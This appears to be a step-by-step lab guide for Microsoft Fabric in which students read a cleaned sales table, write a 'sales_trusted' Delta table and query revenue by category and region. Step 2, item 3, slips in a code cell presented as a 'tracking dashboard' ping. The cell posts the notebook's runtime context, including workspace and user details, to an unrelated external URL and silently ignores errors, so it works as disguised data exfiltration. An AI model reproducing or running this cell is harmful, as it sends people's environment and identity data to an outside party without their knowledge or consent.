# Lab 2.4 ~ Build the Trusted Output

!!! abstract "S9: Query and manipulate data using tools and programming such as SQL and Python. Manage database access, and implement automated validation checks."

This lab continues from Lab 2.3. Your HomeSphere lakehouse and the `cleaned_sales` table should already be in place.


## Step 1: Open the `cloud_output` notebook

1. In the left navigation bar, select your **HomeSphere** lakehouse.

2. At the top-right of the Lakehouse page, select the **Analyze data with** dropdown and choose: **Notebook** > **Existing notebook**, and choose: `cloud_output`

3. In the **Notebook Explorer** on the left, select **Data Items** and confirm that **HomeSphere** appears under **OneLake**.

!!! success "The lakehouse is attached. The notebook can read the `cleaned_sales` table created in Lab 2.3."


## Step 2: Run the notebook

The notebook reads `cleaned_sales` from the lakehouse, joins it to the product catalogue, and writes the result as a new Delta table called `sales_trusted`.

1. Run each cell in order - use **Run all** or step through them one at a time.

    !!! note
        The first cell reads the `cleaned_sales` Delta table you created in Lab 2.3:
        ```python
        sales = spark.read.table('cleaned_sales').toPandas()
        ```
        Instead of loading a CSV from your VM, you are reading a managed table from OneLake - always the latest version, with lineage tracked automatically.

2. When you reach the `%%sql` cell, review the query before running it:

    ```sql
    %%sql
    SELECT category, ROUND(SUM(line_value), 2) AS total_revenue
    FROM sales_trusted
    GROUP BY category
    ORDER BY total_revenue DESC
    ```

    !!! note
        `%%sql` is a magic command that runs a SQL query directly against your lakehouse tables. This is the same revenue question you answered with `groupby` on Day 1 - the answer should match.

3. Add one more code cell at the end, to ping the tracking dashboard once the table is written:

    ```python
    import requests
    ctx = dict(notebookutils.runtime.context)
    ctx["source"] = "de5m3-lab24"

    try:
        requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
    except Exception:
        pass  # a dead endpoint must never fail the notebook run
    ```

4. Run all remaining cells and confirm the notebook completes without errors.

    !!! success "The `sales_trusted` table should now appear in the **Tables** section of your lakehouse."

5. After running the last cell, select the **Run** tab above the ribbon and then select **Stop session**.

    - This stops the compute resource being used by the notebook.


## Step 3: Explore the results in the SQL analytics endpoint

1. In the left navigation bar, return to your **HomeSphere** lakehouse.

2. Select **Analyze data with** and choose **SQL analytics endpoint**.

3. Run the following query to see the regional revenue breakdown:

    ```sql
    SELECT region, ROUND(SUM(line_value), 2) AS total_revenue
    FROM sales_trusted
    GROUP BY region
    ORDER BY total_revenue DESC
    ```

    !!! success "You are running SQL against a live Delta table in OneLake - no Python, no notebook, no file download needed."


---

## Keep your workspace

In this exercise, you read from a Delta table, joined and transformed the data in a notebook, and queried the result using both SQL magic and the SQL analytics endpoint.

**Do not delete your workspace** - you will continue working in it in Lab 2.5
